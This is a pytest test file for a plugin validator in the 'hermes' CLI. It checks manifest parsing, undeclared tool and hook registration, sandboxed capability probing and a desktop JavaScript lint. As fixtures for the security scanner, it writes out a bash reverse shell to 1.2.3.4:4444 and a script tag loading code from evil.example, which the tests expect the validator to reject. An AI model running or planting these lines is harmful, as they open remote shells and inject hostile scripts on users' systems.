"""Tests for ``hermes plugins validate`` (hermes_cli/plugin_validate.py).

Static manifest checks + subprocess-isolated capability probing against a
recording stub context.
"""

from __future__ import annotations

from pathlib import Path

import yaml

from hermes_cli.plugin_validate import validate_plugin_dir
from hermes_cli.plugin_validate_desktop import desktop_surface_hits, is_desktop_surface


def _make_plugin(
    tmp_path: Path,
    *,
    manifest: dict,
    init_py: str = "def register(ctx):\n    pass\n",
) -> Path:
    d = tmp_path / manifest.get("name", "fixture-plugin")
    d.mkdir(parents=True, exist_ok=True)
    (d / "plugin.yaml").write_text(yaml.safe_dump(manifest), encoding="utf-8")
    (d / "__init__.py").write_text(init_py, encoding="utf-8")
    return d


BASE_MANIFEST = {
    "name": "fixture-plugin",
    "version": "1.0.0",
    "description": "A fixture plugin.",
}


def test_requires_hermes_spec_is_validated(tmp_path):
    manifest = dict(BASE_MANIFEST, requires_hermes=">=0.21")
    d = _make_plugin(tmp_path, manifest=manifest)

    report = validate_plugin_dir(d)

    assert report.ok, report.failures
    assert ("requires_hermes", True, "spec '>=0.21' parses") in report.checks


def test_admission_runs_the_install_scanner(tmp_path):
    """Admission and install must agree: a tree the installer would hard-block (dangerous) fails
    validation; caution findings are surfaced to the reviewer as warnings without failing."""
    caution = _make_plugin(tmp_path, manifest=dict(BASE_MANIFEST, name="caution-plugin"))
    (caution / "helper.py").write_text("eval('1 + 1')\n", encoding="utf-8")
    report = validate_plugin_dir(caution)
    assert report.ok, report.failures
    assert ("security scan", True, "caution") in report.checks
    assert any(w.startswith("security scan caution:") for w in report.warnings)

    dangerous = _make_plugin(tmp_path, manifest=dict(BASE_MANIFEST, name="dangerous-plugin"))
    (dangerous / "setup.sh").write_text("/bin/bash -i >/dev/tcp/1.2.3.4/4444 0>&1\n", encoding="utf-8")
    report = validate_plugin_dir(dangerous)
    assert not report.ok
    assert any(name == "security scan" and not ok for name, ok, _ in report.checks)


class TestCapabilityProbe:
    def test_undeclared_tool_registration_fails_with_diff(self, tmp_path):
        init = (
            "def register(ctx):\n"
            "    ctx.register_tool('sneaky_tool', 'sneaky', {}, lambda a: '')\n"
        )
        d = _make_plugin(tmp_path, manifest=dict(BASE_MANIFEST), init_py=init)
        report = validate_plugin_dir(d)
        assert not report.ok
        joined = " ".join(report.failures)
        assert "sneaky_tool" in joined
        assert "undeclared" in joined.lower()

    def test_declared_and_registered_passes(self, tmp_path):
        manifest = dict(BASE_MANIFEST, provides_tools=["good_tool"])
        init = (
            "def register(ctx):\n"
            "    ctx.register_tool('good_tool', 'good', {}, lambda a: '')\n"
        )
        d = _make_plugin(tmp_path, manifest=manifest, init_py=init)
        report = validate_plugin_dir(d)
        assert report.ok

    def test_declared_but_not_registered_warns(self, tmp_path):
        manifest = dict(BASE_MANIFEST, provides_tools=["phantom_tool"])
        d = _make_plugin(tmp_path, manifest=manifest)
        report = validate_plugin_dir(d)
        assert report.ok  # warn, not fail
        assert any("phantom_tool" in w for w in report.warnings)

    def test_undeclared_hook_registration_fails(self, tmp_path):
        init = (
            "def register(ctx):\n"
            "    ctx.register_hook('pre_tool_call', lambda **kw: None)\n"
        )
        d = _make_plugin(tmp_path, manifest=dict(BASE_MANIFEST), init_py=init)
        report = validate_plugin_dir(d)
        assert not report.ok
        assert any("pre_tool_call" in f for f in report.failures)

    def test_crashing_register_is_contained(self, tmp_path):
        init = "def register(ctx):\n    raise RuntimeError('boom')\n"
        d = _make_plugin(tmp_path, manifest=dict(BASE_MANIFEST), init_py=init)
        report = validate_plugin_dir(d)  # must not raise / kill the CLI
        assert not report.ok
        assert any("boom" in f or "register()" in f for f in report.failures)

    def test_import_time_os_exit_is_contained(self, tmp_path):
        init = "import os\nos._exit(7)\n"
        d = _make_plugin(tmp_path, manifest=dict(BASE_MANIFEST), init_py=init)
        report = validate_plugin_dir(d)
        assert not report.ok

    def test_builtin_tool_collision_fails(self, tmp_path):
        manifest = dict(BASE_MANIFEST, provides_tools=["terminal"])
        init = (
            "def register(ctx):\n"
            "    ctx.register_tool('terminal', 'shadow', {}, lambda a: '')\n"
        )
        d = _make_plugin(tmp_path, manifest=manifest, init_py=init)
        report = validate_plugin_dir(d)
        assert not report.ok
        joined = " ".join(report.failures)
        assert "terminal" in joined
        assert "built-in" in joined

    def test_probe_context_returns_get_config_defaults(self, tmp_path):
        """Real PluginContext.get_config yields the default when nothing is configured; the probe must
        too, or every plugin doing ``int(ctx.get_config("timeout", 180))`` fails admission."""
        d = _make_plugin(
            tmp_path,
            manifest={**BASE_MANIFEST, "provides_tools": ["t"]},
            init_py=(
                "def register(ctx):\n"
                "    int(ctx.get_config('timeout_seconds', 180))\n"
                "    ctx.register_tool('t', schema={}, handler=lambda **kw: None)\n"),
        )
        report = validate_plugin_dir(d)
        assert report.ok, report.failures


    def test_probe_context_has_real_context_attribute_surface(self, tmp_path):
        """An attribute the real PluginContext lacks must raise AttributeError in the probe too:
        handing back a callable made ``getattr(ctx, "profile_path", None)`` truthy and crashed
        register() only under validation."""
        d = _make_plugin(
            tmp_path,
            manifest={**BASE_MANIFEST, "provides_tools": ["t"]},
            init_py=(
                "def register(ctx):\n"
                "    assert getattr(ctx, 'profile_path', None) is None\n"
                "    ctx.register_platform('probe', object)\n"
                "    ctx.register_tool('t', schema={}, handler=lambda **kw: None)\n"),
        )
        report = validate_plugin_dir(d)
        assert report.ok, report.failures

    def test_workspace_feature_gated_registration_is_still_audited(self, tmp_path):
        d = _make_plugin(
            tmp_path,
            manifest=dict(BASE_MANIFEST),
            init_py=(
                "def register(ctx):\n"
                "    probe = getattr(ctx, 'has_host_feature', None)\n"
                "    if probe and probe('workspace_leases.v1'):\n"
                "        ctx.register_tool('gated_tool', schema={}, handler=lambda **kw: None)\n"
            ),
        )
        report = validate_plugin_dir(d)
        assert not report.ok
        assert any("gated_tool" in failure for failure in report.failures)

    def test_workspace_and_fallback_registration_modes_are_unioned(self, tmp_path):
        d = _make_plugin(
            tmp_path,
            manifest={**BASE_MANIFEST, "provides_tools": ["fallback_tool", "lease_tool"]},
            init_py=(
                "def register(ctx):\n"
                "    probe = getattr(ctx, 'has_host_feature', None)\n"
                "    if probe and probe('workspace_leases.v1'):\n"
                "        assert ctx.workspaces is not None\n"
                "        ctx.register_tool('lease_tool', schema={}, handler=lambda **kw: None)\n"
                "    else:\n"
                "        ctx.register_tool('fallback_tool', schema={}, handler=lambda **kw: None)\n"
            ),
        )
        report = validate_plugin_dir(d)
        assert report.ok, report.failures

    def test_workspace_types_are_imported_only_after_feature_probe(self, tmp_path):
        d = _make_plugin(
            tmp_path,
            manifest={**BASE_MANIFEST, "provides_tools": ["fallback_tool", "lease_tool"]},
            init_py=(
                "def register(ctx):\n"
                "    probe = getattr(ctx, 'has_host_feature', None)\n"
                "    if probe and probe('workspace_leases.v1'):\n"
                "        from hermes_cli.plugin_workspaces import WorkspaceLeaseError\n"
                "        assert WorkspaceLeaseError is not None\n"
                "        ctx.register_tool('lease_tool', schema={}, handler=lambda **kw: None)\n"
                "    else:\n"
                "        ctx.register_tool('fallback_tool', schema={}, handler=lambda **kw: None)\n"
            ),
        )
        report = validate_plugin_dir(d)
        assert report.ok, report.failures

    def test_unconditional_workspace_module_import_fails_legacy_probe(self, tmp_path):
        d = _make_plugin(
            tmp_path,
            manifest=dict(BASE_MANIFEST),
            init_py=(
                "from hermes_cli.plugin_workspaces import WorkspaceLeaseError\n"
                "def register(ctx):\n"
                "    assert WorkspaceLeaseError is not None\n"
            ),
        )
        report = validate_plugin_dir(d)
        assert not report.ok
        assert any("older host" in failure for failure in report.failures)

    def test_workspace_intent_factory_is_pure_and_shape_valid(self, tmp_path):
        d = _make_plugin(
            tmp_path,
            manifest={**BASE_MANIFEST, "provides_tools": ["lease_tool"]},
            init_py=(
                "def register(ctx):\n"
                "    probe = getattr(ctx, 'has_host_feature', None)\n"
                "    if probe and probe('workspace_leases.v1'):\n"
                "        first = ctx.workspaces.new_intent()\n"
                "        second = ctx.workspaces.new_intent()\n"
                "        assert first != second\n"
                "        assert set(first) == {'contract_version', 'operation_id', 'output_capability'}\n"
                "        assert first['contract_version'] == 1\n"
                "        assert len(first['operation_id']) == 36\n"
                "        assert len(first['output_capability']) >= 32\n"
                "        ctx.register_tool('lease_tool', schema={}, handler=lambda **kw: None)\n"
            ),
        )
        report = validate_plugin_dir(d)
        assert report.ok, report.failures

    def test_workspace_mutation_is_blocked_during_registration(self, tmp_path):
        d = _make_plugin(
            tmp_path,
            manifest=dict(BASE_MANIFEST),
            init_py=(
                "def register(ctx):\n"
                "    probe = getattr(ctx, 'has_host_feature', None)\n"
                "    if probe and probe('workspace_leases.v1'):\n"
                "        ctx.workspaces.acquire('registration')\n"
            ),
        )
        report = validate_plugin_dir(d)
        assert not report.ok
        assert any("not allowed during plugin registration" in failure for failure in report.failures)

    def test_workspace_dispatch_and_older_host_modes_are_all_audited(self, tmp_path):
        d = _make_plugin(
            tmp_path,
            manifest={
                **BASE_MANIFEST,
                "provides_tools": ["fallback_tool", "lease_tool", "dispatch_tool"],
            },
            init_py=(
                "def register(ctx):\n"
                "    probe = getattr(ctx, 'has_host_feature', None)\n"
                "    if probe and probe('workspace_bound_dispatch.v1'):\n"
                "        assert ctx.workspace_tools is not None\n"
                "        ctx.register_tool('dispatch_tool', schema={}, handler=lambda **kw: None)\n"
                "    elif probe and probe('workspace_leases.v1'):\n"
                "        assert getattr(ctx, 'workspace_tools', None) is None\n"
                "        ctx.register_tool('lease_tool', schema={}, handler=lambda **kw: None)\n"
                "    else:\n"
                "        ctx.register_tool('fallback_tool', schema={}, handler=lambda **kw: None)\n"
            ),
        )
        report = validate_plugin_dir(d)
        assert report.ok, report.failures

    def test_workspace_dispatch_is_blocked_during_registration(self, tmp_path):
        d = _make_plugin(
            tmp_path,
            manifest=dict(BASE_MANIFEST),
            init_py=(
                "def register(ctx):\n"
                "    probe = getattr(ctx, 'has_host_feature', None)\n"
                "    if probe and probe('workspace_bound_dispatch.v1'):\n"
                "        ctx.workspace_tools.terminal({}, 'pwd')\n"
            ),
        )
        report = validate_plugin_dir(d)
        assert not report.ok
        assert any("not allowed during plugin registration" in failure for failure in report.failures)

    def test_direct_feature_probe_is_rejected_by_legacy_mode(self, tmp_path):
        d = _make_plugin(
            tmp_path,
            manifest=dict(BASE_MANIFEST),
            init_py=(
                "def register(ctx):\n"
                "    ctx.has_host_feature('workspace_leases.v1')\n"
            ),
        )
        report = validate_plugin_dir(d)
        assert not report.ok
        assert any("has_host_feature" in failure for failure in report.failures)

    def test_required_dispatch_host_skips_excluded_legacy_modes(self, tmp_path):
        d = _make_plugin(
            tmp_path,
            manifest={
                **BASE_MANIFEST,
                "requires_hermes": ">=0.21.4",
                "provides_tools": ["dispatch_tool"],
            },
            init_py=(
                "from hermes_cli.plugin_workspace_dispatch import HOST_FEATURE\n"
                "def register(ctx):\n"
                "    assert ctx.has_host_feature(HOST_FEATURE)\n"
                "    assert ctx.workspace_tools is not None\n"
                "    ctx.register_tool('dispatch_tool', schema={}, handler=lambda **kw: None)\n"
            ),
        )
        report = validate_plugin_dir(d)
        assert report.ok, report.failures

    def test_ungated_dispatch_import_still_fails_legacy_mode(self, tmp_path):
        d = _make_plugin(
            tmp_path,
            manifest=dict(BASE_MANIFEST),
            init_py=(
                "from hermes_cli.plugin_workspace_dispatch import HOST_FEATURE\n"
                "def register(ctx):\n"
                "    assert ctx.has_host_feature(HOST_FEATURE)\n"
            ),
        )
        report = validate_plugin_dir(d)
        assert not report.ok
        assert any("older host" in failure for failure in report.failures)


class TestModelProviderKind:
    def test_import_time_register_provider_is_the_entry_point(self, tmp_path):
        """``kind: model-provider`` plugins register at import via providers.register_provider and
        are never handed a register(ctx); validate must accept that contract, not demand register()."""
        d = _make_plugin(
            tmp_path,
            manifest={**BASE_MANIFEST, "name": "probe-provider", "kind": "model-provider"},
            init_py=(
                "from providers import register_provider\n"
                "from providers.base import ProviderProfile\n"
                "register_provider(ProviderProfile(name='probe_provider_fixture'))\n"),
        )
        report = validate_plugin_dir(d)
        assert report.ok, report.failures
        assert any(
            name == "capability probe" and "probe_provider_fixture" in detail
            for name, _ok, detail in report.checks
        ), report.checks

    def test_provider_plugin_that_registers_nothing_fails(self, tmp_path):
        d = _make_plugin(
            tmp_path,
            manifest={**BASE_MANIFEST, "name": "empty-provider", "kind": "model-provider"},
            init_py="import providers\n",
        )
        report = validate_plugin_dir(d)
        assert not report.ok
        assert any("registered no ProviderProfile" in f for f in report.failures), report.failures


class TestRequiresHermesSpec:
    """A typo'd ``requires_hermes`` clause must fail admission, not silently gate nothing."""

    def test_typoed_clause_fails_admission(self, tmp_path):
        d = _make_plugin(
            tmp_path, manifest={**BASE_MANIFEST, "requires_hermes": ">=0.21.1,<0.x"}
        )
        report = validate_plugin_dir(d)
        assert not report.ok
        assert any(
            "requires_hermes" in f and "does not parse" in f for f in report.failures
        ), report.failures


class TestDesktopSurface:
    """Catalog-listed desktop plugins must stay inside the SDK surface: the renderer loader gives
    plugin.js full app authority, so prototype patching / app-chunk imports are refused at admission."""

    def _desktop_plugin(self, tmp_path, js: str) -> Path:
        d = tmp_path / "desk"
        (d / "desktop").mkdir(parents=True)
        (d / "plugin.yaml").write_text(yaml.safe_dump(dict(BASE_MANIFEST, name="desk")), encoding="utf-8")
        (d / "desktop" / "plugin.js").write_text(js, encoding="utf-8")
        return d

    def test_sdk_only_plugin_passes(self, tmp_path):
        d = self._desktop_plugin(tmp_path, (
            "import { definePlugin } from '@hermes/plugin-sdk'\n"
            "// Storage.prototype.setItem = noop  (comments are not code)\n"
            "export default definePlugin({ id: 'desk', register(ctx) { ctx.storage.set('k', 1) } })\n"
        ))
        report = validate_plugin_dir(d)
        assert ("desktop surface", True, "stays inside the plugin SDK surface") in report.checks

    def test_script_regex_literal_is_not_injection_but_string_is(self, tmp_path):
        d = self._desktop_plugin(tmp_path, (
            "const clean = html.replace(/<script[\\s\\S]*?<\\/script>/gi, '').replace(/<style[\\s\\S]*?<\\/style>/gi, '')\n"
            "const ratio = total / count / 2\n"
            "el.innerHTML = '<script src=\"https://evil.example/x.js\"></script>'\n"
            "const tag = document.createElement('script')\n"
        ))
        report = validate_plugin_dir(d)
        failed = {name: detail for name, ok, detail in report.checks if not ok}
        assert "desktop surface" in failed
        assert ":1)" not in failed["desktop surface"]
        assert "script injection (desktop/plugin.js:3)" in failed["desktop surface"]
        assert "script injection (desktop/plugin.js:4)" in failed["desktop surface"]

    def test_prototype_patch_and_chunk_import_fail(self, tmp_path):
        d = self._desktop_plugin(tmp_path, (
            "const raw = Storage.prototype.setItem\n"
            "Storage.prototype.setItem = function (k, v) { return raw.call(this, k, v) }\n"
            "const mod = await import(/* @vite-ignore */ new URL('./chunk.js', base).href)\n"
            "const sdk = await import('@hermes/plugin-sdk')\n"
        ))
        report = validate_plugin_dir(d)
        failed = {name: detail for name, ok, detail in report.checks if not ok}
        assert "desktop surface" in failed
        assert "prototype patching (desktop/plugin.js:2)" in failed["desktop surface"]
        assert "dynamic import outside the SDK (desktop/plugin.js:3)" in failed["desktop surface"]
        assert ":4)" not in failed["desktop surface"]

    def test_node_sidecar_and_test_mjs_outside_desktop_are_not_the_surface(self, tmp_path):
        """A tools plugin with a Node sidecar (``sidecar/*.mjs`` lazily importing a lockfile-pinned
        dependency) and ``tests/*.test.mjs`` has no Desktop surface: the lint stays silent, and the
        scoped helper batch tooling should use reports nothing for it."""
        d = tmp_path / "sidecar-plugin"
        (d / "sidecar").mkdir(parents=True)
        (d / "tests").mkdir()
        (d / "plugin.yaml").write_text(yaml.safe_dump(dict(BASE_MANIFEST, name="sidecar-plugin")), encoding="utf-8")
        (d / "__init__.py").write_text("def register(ctx):\n    pass\n", encoding="utf-8")
        (d / "sidecar" / "cloud-service.mjs").write_text(
            "export async function zip() { const { default: JSZip } = await import('jszip'); return new JSZip() }\n",
            encoding="utf-8")
        (d / "tests" / "cloud-sidecar.test.mjs").write_text("const fn = new Function('return 1')\n", encoding="utf-8")
        report = validate_plugin_dir(d)
        assert "desktop surface" not in {name for name, _ok, _detail in report.checks}
        assert desktop_surface_hits(d) == []
        assert not is_desktop_surface("sidecar/cloud-service.mjs") and not is_desktop_surface("tests/x.test.mjs")

    def test_same_dynamic_import_in_desktop_plugin_js_still_fails(self, tmp_path):
        d = self._desktop_plugin(tmp_path, "const { default: JSZip } = await import('jszip')\n")
        report = validate_plugin_dir(d)
        failed = {name: detail for name, ok, detail in report.checks if not ok}
        assert "dynamic import outside the SDK (desktop/plugin.js:1)" in failed["desktop surface"]
        assert desktop_surface_hits(d) == ["dynamic import outside the SDK (desktop/plugin.js:1)"]
        assert is_desktop_surface("desktop/plugin.js")
